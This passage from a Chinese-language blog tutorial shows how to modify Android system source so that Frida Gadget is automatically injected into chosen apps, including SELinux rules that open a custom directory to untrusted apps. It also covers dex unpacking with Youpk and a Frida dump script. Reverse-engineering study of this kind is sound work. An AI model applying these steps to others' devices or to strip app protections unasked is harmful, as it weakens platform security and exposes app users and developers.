class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaojianbang;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Persist</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SO_NAME</span> <span class="operator">=</span> <span class="string">&quot;libxiaojianbang.so&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SO_CONFIG_NAME</span> <span class="operator">=</span> <span class="string">&quot;libxiaojianbang.config.so&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LIB32_DIR</span> <span class="operator">=</span> <span class="string">&quot;/system/lib&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LIB64_DIR</span> <span class="operator">=</span> <span class="string">&quot;/system/lib64&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SETTINGS_DIR</span> <span class="operator">=</span> <span class="string">&quot;/data/system/xsettings/xiaojianbang/persist&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ENABLE_PERSIST_FILE_NAME</span> <span class="operator">=</span> <span class="string">&quot;xiaojianbang_persist&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_JS_DIR</span> <span class="operator">=</span> <span class="string">&quot;/data/system/xsettings/xiaojianbang/jscfg&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_JS_FILE_NAME</span> <span class="operator">=</span> <span class="string">&quot;config.js&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG_NAME</span> <span class="operator">=</span> <span class="string">&quot;xiaojianbang_persist&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">LOGD</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.d(TAG_NAME, msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">saveFile</span><span class="params">(String filePath, String textMsg)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(filePath);</span><br><span class="line">            fileOutputStream.write(textMsg.getBytes(<span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">            fileOutputStream.flush();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">copyFile</span><span class="params">(File srcFile, File dstFile)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(srcFile);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dstFile);</span><br><span class="line">            <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span> * <span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>((len = fileInputStream.read(data)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                fileOutputStream.write(data,<span class="number">0</span>, len);</span><br><span class="line">                fileOutputStream.flush();</span><br><span class="line">            &#125;</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断app是否打开自动注入脚本功能</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEnablePersist</span><span class="params">(String pkgName)</span> &#123;</span><br><span class="line">        <span class="comment">// 判断文件是否存在 /data/system/xsettings/xiaojianbang/persist/com.xiaojianbang.app/xiaojianbang_persist</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">enableFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(SETTINGS_DIR, pkgName + File.separator + ENABLE_PERSIST_FILE_NAME);</span><br><span class="line">        <span class="keyword">return</span> enableFile.exists();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取源JS文件路径</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">getConfigJSPath</span><span class="params">(String pkgName)</span> &#123;</span><br><span class="line">        <span class="comment">// /data/system/xsettings/xiaojianbang/jscfg/com.xiaojianbang.app/config.js</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(CONFIG_JS_DIR, pkgName + File.separator + CONFIG_JS_FILE_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 拷贝源JS文件到app私有目录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">copyJSFile</span><span class="params">(Context context, String pkgName)</span> &#123;</span><br><span class="line">        <span class="comment">// 判断源JS文件是否存在</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">srcJSFile</span> <span class="operator">=</span> getConfigJSPath(pkgName);</span><br><span class="line">        <span class="keyword">if</span>(!srcJSFile.exists()) &#123;</span><br><span class="line">            LOGD(<span class="string">&quot;srcJSFile not exists&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 拷贝源JS文件到app私有目录</span></span><br><span class="line">        <span class="comment">// /data/data/com.xiaojianbang.app/files/config.js</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">dstJSFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), CONFIG_JS_FILE_NAME);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isCopyJSOk</span> <span class="operator">=</span> copyFile(srcJSFile, dstJSFile);</span><br><span class="line">        <span class="keyword">if</span>(!isCopyJSOk)&#123;</span><br><span class="line">            LOGD(<span class="string">&quot;copyJSFile fail: &quot;</span> + srcJSFile + <span class="string">&quot; -&gt; &quot;</span> + dstJSFile);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dstJSFile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成Gadget配置文件</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">genGadgetConfig</span><span class="params">(Context context, File dstJSFile)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">childObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            childObj.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;script&quot;</span>);</span><br><span class="line">            childObj.put(<span class="string">&quot;path&quot;</span>, dstJSFile.toString());</span><br><span class="line">            jsonObject.put(<span class="string">&quot;interaction&quot;</span>, childObj);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">configFilePath</span> <span class="operator">=</span> context.getFilesDir() + File.separator + SO_CONFIG_NAME;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isSaveOk</span> <span class="operator">=</span> saveFile(configFilePath, jsonObject.toString());</span><br><span class="line">        <span class="keyword">if</span>(!isSaveOk)&#123;</span><br><span class="line">            LOGD(<span class="string">&quot;saveFile fail: &quot;</span> + configFilePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 拷贝源so文件到app私有目录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">copySoFile</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="comment">// 判断源so文件是否存在</span></span><br><span class="line">        <span class="comment">// /system/lib/libxiaojianbang.so   //与后面修改“handheld_system.mk”路径对应</span></span><br><span class="line">        <span class="comment">// /system/lib64/libxiaojianbang.so</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">srcSoFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(LIB32_DIR, SO_NAME);</span><br><span class="line">        <span class="keyword">if</span>(Process.is64Bit()) &#123;</span><br><span class="line">            srcSoFile = <span class="keyword">new</span> <span class="title class_">File</span>(LIB64_DIR, SO_NAME);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!srcSoFile.exists()) &#123;</span><br><span class="line">            LOGD(<span class="string">&quot;srcSoFile not exists&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 拷贝源so文件到app私有目录</span></span><br><span class="line">        <span class="comment">// /data/data/com.xiaojianbang.app/files/libxiaojianbang.so</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">dstSoFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), SO_NAME);</span><br><span class="line">        <span class="keyword">if</span>(srcSoFile.length() != dstSoFile.length()) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isCopyFileOk</span> <span class="operator">=</span> copyFile(srcSoFile, dstSoFile);</span><br><span class="line">            <span class="keyword">if</span>(!isCopyFileOk)&#123;</span><br><span class="line">                LOGD(<span class="string">&quot;copySoFile fail: &quot;</span> + srcSoFile + <span class="string">&quot; -&gt; &quot;</span> + dstSoFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dstSoFile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 进行Frida Gadget持久化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">doXiaojianbangPersist</span><span class="params">(Context context, String pkgName)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dstJSFile</span> <span class="operator">=</span> copyJSFile(context, pkgName);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> == dstJSFile) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!genGadgetConfig(context, dstJSFile)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dstSoFile</span> <span class="operator">=</span> copySoFile(context);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> == dstSoFile) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        System.load(dstSoFile.toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="将自定义包加入白名单"><a href="#将自定义包加入白名单" class="headerlink" title="将自定义包加入白名单"></a>将自定义包加入白名单</h2><p>自定义包和类一般不会被编译，所以要加入白名单</p><p>白名单文件路径</p><p><code>/build/make/core/tasks/check_boot_jars/package_whitelist.txt</code></p><p>随便加入一个位置就可以</p><h2 id="frida-gadget集成到系统"><a href="#frida-gadget集成到系统" class="headerlink" title="frida-gadget集成到系统"></a>frida-gadget集成到系统</h2><p> frida官网下载32位和64位frida-gadget，放在安卓系统源码<code>/frameworks/base/cmds/libxiaojianbang</code>下</p><p>修改源码以下文件<code>/build/make/target/product/handheld_system.mk</code>，将 frida-gadget 拷贝到编译以后的系统中</p><p>修改内容</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="comment">// add</span></span></span><br><span class="line">PRODUCT_COPY_FILES += \</span><br><span class="line">    frameworks<span class="keyword">/base/</span>cmds<span class="keyword">/xiaojianbang/</span>frida-gadget<span class="number">-14.2</span><span class="number">.18</span>-android-arm.so:$(TARGET_COPY_OUT_SYSTEM)<span class="keyword">/lib/</span>libxiaojianbang.so \</span><br><span class="line">    frameworks<span class="keyword">/base/</span>cmds<span class="keyword">/xiaojianbang/</span>frida-gadget<span class="number">-14.2</span><span class="number">.18</span>-android-arm64.so:$(TARGET_COPY_OUT_SYSTEM)<span class="keyword">/lib64/</span>libxiaojianbang.so</span><br><span class="line"><span class="meta"># <span class="comment">// add</span></span></span><br><span class="line"></span><br><span class="line">这样就会把源码中的“<span class="keyword">/frameworks/</span>base<span class="keyword">/cmds/</span>libxiaojianbang”下的frida-gadget文件导入到系统目录下(具体导入的位置要和前面自定义类中写的存放fridagadget.so路径一致)</span><br></pre></td></tr></table></figure><h2 id="开机创建自定义目录"><a href="#开机创建自定义目录" class="headerlink" title="开机创建自定义目录"></a>开机创建自定义目录</h2><p>在frida-gadget持久化的时候，讲师把.js文件gadget的配置文件等放入了自定义的目录下，为了防止每次刷机自己手动创建</p><p>所以在<code>/system/core/rootdir/init.rc 文件中添加以下数据 625</code>添加以下：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="comment">// add</span></span></span><br><span class="line">   <span class="meta"># /data/system/xsettings/xiaojianbang/persist</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings/xiaojianbang <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings/xiaojianbang/persist <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings/xiaojianbang/jscfg <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="meta"># <span class="comment">// add</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="为自定义目录关联文件类型标签"><a href="#为自定义目录关联文件类型标签" class="headerlink" title="为自定义目录关联文件类型标签"></a>为自定义目录关联文件类型标签</h2><p>1）创建文件类型SeLinux标签：xiaojianbang_file</p><p>在如下两个文件中/system/sepolicy/public/file.te，/system/sepolicy/prebuilts/api/29.0/public/file.te</p><p>添加数据 405</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">// add</span></span><br><span class="line"># /data/<span class="keyword">system</span>/xsettings/xiaojianbang/persist</span><br><span class="line">type xiaojianbang_file, file_type, data_file_type, core_data_file_type, mlstrustedobject;</span><br><span class="line"># <span class="comment">// add</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2）自定义目录关联文件类型标签: xiaojianbang_file</p><p>在如下两个文件中/system/sepolicy/private/file_contexts，/system/sepolicy/prebuilts/api/29.0/private/file_contexts</p><p>添加数据 122</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">// add</span></span><br><span class="line"># /data/<span class="keyword">system</span>/xsettings/xiaojianbang/persist</span><br><span class="line">/data/<span class="keyword">system</span>/xsettings(/.*)?u:object_r:xiaojianbang_file:s0</span><br><span class="line"># <span class="comment">// add</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="配置app访问标签文件权限"><a href="#配置app访问标签文件权限" class="headerlink" title="配置app访问标签文件权限"></a>配置app访问标签文件权限</h2><p>1）配置system app访问 xiaojianbang_file 标签文件的权限</p><p>在如下文件中/system/sepolicy/private/system_app.te和/system/sepolicy/prebuilts/api/29.0/private/system_app.te</p><p>添加如下数据 (末尾)</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># // add</span></span><br><span class="line"><span class="comment"># add for accessing xiaojianbang_file</span></span><br><span class="line">allow system_app xiaojianbang_file:dir  &#123; getattr setattr <span class="keyword">open</span> <span class="keyword">read</span> <span class="keyword">write</span> remove_name create add_name search <span class="keyword">rmdir</span> &#125;;</span><br><span class="line">allow system_app xiaojianbang_file:file &#123; getattr setattr <span class="keyword">open</span> <span class="keyword">read</span> <span class="keyword">write</span> create <span class="keyword">unlink</span> &#125;;=</span><br></pre></td></tr></table></figure><p>2）配置第三方app访问 xiaojianbang_file 标签文件的权限</p><p>在如下文件中</p><p>/system/sepolicy/private/untrusted_app.te</p><p>/system/sepolicy/private/untrusted_app_25.te</p><p>/system/sepolicy/private/untrusted_app_27.te</p><p>/system/sepolicy/private/untrusted_app_all.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app_25.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app_27.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app_all.te</p><p>添加如下数据(末尾)</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">// add</span></span><br><span class="line"><span class="meta"># add for accessing xiaojianbang_file</span></span><br><span class="line"><span class="function">allow <span class="title">untrusted_app</span><span class="params">(与文件名要一致)</span> xiaojianbang_file:dir  &#123;</span> getattr open read write search rmdir &#125;;</span><br><span class="line">allow untrusted_app（与文件名要一致 xiaojianbang_file:file &#123; getattr open read write &#125;;</span><br></pre></td></tr></table></figure><h2 id="常见的编译错误"><a href="#常见的编译错误" class="headerlink" title="常见的编译错误"></a>常见的编译错误</h2><p>1）修改以下文件，防止报错：标签xiaojianbang_file 未定义</p><p>/system/sepolicy/private/compat/26.0/26.0.ignore.cil 17</p><p>/system/sepolicy/private/compat/27.0/27.0.ignore.cil 16</p><p>/system/sepolicy/private/compat/28.0/28.0.ignore.cil 15</p><p>/system/sepolicy/prebuilts/api/29.0/private/compat/26.0/26.0.ignore.cil 17</p><p>/system/sepolicy/prebuilts/api/29.0/private/compat/27.0/27.0.ignore.cil 16</p><p>/system/sepolicy/prebuilts/api/29.0/private/compat/28.0/28.0.ignore.cil 15</p><p>在以上文件中加入标签名数据 xiaojianbang_file，两个文件添加的内容需要一致</p><p>2） You have tried to change the API from what has been previously released inan SDK.  Please fix the errors listed above</p><p>修改了代码以后，有些时候需要先 make update-api，再编译</p><h2 id="Frida持久化管理app的开发"><a href="#Frida持久化管理app的开发" class="headerlink" title="Frida持久化管理app的开发"></a>Frida持久化管理app的开发</h2><p>工程名字：xjbPersistDemo</p><ol><li>管理app的功能<br>显示已安装app列表<br>可以对每个app指定需要注入的JS<br>可以设置是否启用持久化</li><li>相应功能实现原理<br>3.1 创建表示启用的文件    /data/system/xsettings/xiaojianbang/persist/pkgName/xiaojianbang_persist       3.2 指定的JS文件复制到以下目录    /data/system/xsettings/xiaojianbang/jscfg/pkgName/config.js<br>3.3 剩下的复制so、JS文件和加载so的操作，由魔改的doXiaojianbangPersist函数完成</li></ol><p><strong>system权限app开发</strong></p><p>1）创建的目录是system权限，所以app要有system权限：</p><ul><li><p>编写完工程在 manifest 中加入 android:sharedUserId=”android.uid.system”</p></li><li><p>编译生成apk文件，将编译出来的app放入/packages/apps/xiaojianbangPersist</p></li><li><p>编写Android.mk，也放入该文件夹，内容为：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># // add</span></span><br><span class="line"><span class="comment"># 设置当前工作路径</span></span><br><span class="line">LOCAL_PATH:= <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除变量值</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span></span><br><span class="line"><span class="comment"># 生成的模块名称</span></span><br><span class="line">LOCAL_MODULE := ControlAPP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成的模块类型</span></span><br><span class="line">LOCAL_MODULE_CLASS := APPS</span><br><span class="line"><span class="comment"># 生成的模块后缀名,此处为apk</span></span><br><span class="line">LOCAL_MODULE_SUFFIX := <span class="variable">$(COMMON_ANDROID_PACKAGE_SUFFIX)</span></span><br><span class="line"><span class="comment"># 设置模块tag，tags取值可以为:user debug eng tests optional</span></span><br><span class="line"><span class="comment"># optional表示全平台编译</span></span><br><span class="line">LOCAL_MODULE_TAGS := optional</span><br><span class="line"></span><br><span class="line"><span class="comment"># LOCAL_PRIVILEGED_MODULE := true</span></span><br><span class="line"></span><br><span class="line">LOCAL_BUILT_MODULE_STEM := package.apk</span><br><span class="line"></span><br><span class="line">LOCAL_DEX_PREOPT := false</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置源文件</span></span><br><span class="line">LOCAL_SRC_FILES := <span class="variable">$(LOCAL_MODULE)</span>.apk</span><br><span class="line"></span><br><span class="line">LOCAL_CERTIFICATE := platform</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置签名，此处表示保持apk原有签名</span></span><br><span class="line"><span class="comment"># LOCAL_CERTIFICATE := PRESIGNED</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>单独编译指定模块 mmm packages/apps/xiaojianbangPersist</p></li><li><p>编译后的模块在 /out/target/product/sailfish/system/app/ControlAPP(app名字)</p></li><li><p>使用 make snod 将编译出来的文件打包成镜像，刷入system.img即可</p></li></ul><p>2）如果要在编译整个系统时，一起编译这个模块，需要将模块 ControlAPP 加入源码编译链</p><p>2.1 增加的内置模块，如果为APP，加入到如下文件中/build/make/target/product/handheld_product.mk</p><p>2.2 增加的内置模块，如果为可执行程序，加入到如下文件中/build/make/target/product/base_system.mk</p><h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>简单补充刷机的一个注意点，当线刷运行.bat批处理文件时出现无法识别设备：</p><ul><li><p>安装Google USB驱动(Android Studio中即可下载)<img src="2025-01-15-刷机与脱壳机入门/image-20240125184838037.png" alt="image-20240125184838037"></p></li><li><p>此电脑-&gt;右键管理-&gt;设备管理器-&gt;选中没有驱动的android设备-&gt;右键更新驱动程序-&gt;选择浏览我的电脑找到刚才下载的驱动-&gt;确定安装</p></li></ul><h1 id="Youpk脱壳机"><a href="#Youpk脱壳机" class="headerlink" title="Youpk脱壳机"></a>Youpk脱壳机</h1><p>参考：<a href="https://github.com/Youlor/Youpk">https://github.com/Youlor/Youpk</a></p><h2 id="刷机-1"><a href="#刷机-1" class="headerlink" title="刷机"></a>刷机</h2><ul><li>重启至bootloader: <code>adb reboot bootloader</code></li><li>解压 Youpk_sailfish.zip 并双击 <code>flash-all.bat</code></li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>Youpk是一款针对Dex整体加固+各式各样的Dex抽取的脱壳机</p><p>1）配置待脱壳的app包名, 准确来讲是进程名称</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb <span class="keyword">shell</span><span class="language-bash"> <span class="string">&quot;echo 应用包名 &gt;&gt; /data/local/tmp/unpacker.config&quot;</span></span></span><br></pre></td></tr></table></figure><p>2）启动apk等待脱壳 每隔10秒将自动重新脱壳(已完全dump的dex将被忽略), 当日志打印unpack end时脱壳完成</p><p>pull出dump文件, dump文件路径为 <code>/data/data/包名/unpacker</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">adb</span> pull /<span class="class"><span class="keyword">data</span>/<span class="keyword">data</span>/包名/unpacker</span></span><br></pre></td></tr></table></figure><p>3）调用修复工具 dexfixer.jar, 两个参数, 第一个为dump文件目录(unpacker，必须为有效路径), 第二个为重组后的DEX目录(不存在将会创建),合并.bin与.dex</p><p><code>java -jar dexfixer.jar /path/to/unpacker /path/to/output</code></p><h1 id="dump-dex-js脚本脱壳"><a href="#dump-dex-js脚本脱壳" class="headerlink" title="dump_dex.js脚本脱壳"></a>dump_dex.js脚本脱壳</h1><p><strong>这个只能脱壳有dex头的apk文件</strong></p><h2 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h2><p>使用命令</p><p><code>frida -U -f 包名 -l dump_dex.js --no-pause</code>  进行脱壳</p><p>脱壳后的dex文件在/data/data/包名/files文件下</p><p>使用命令 adb pull 推送到手机</p><p>然后重命名 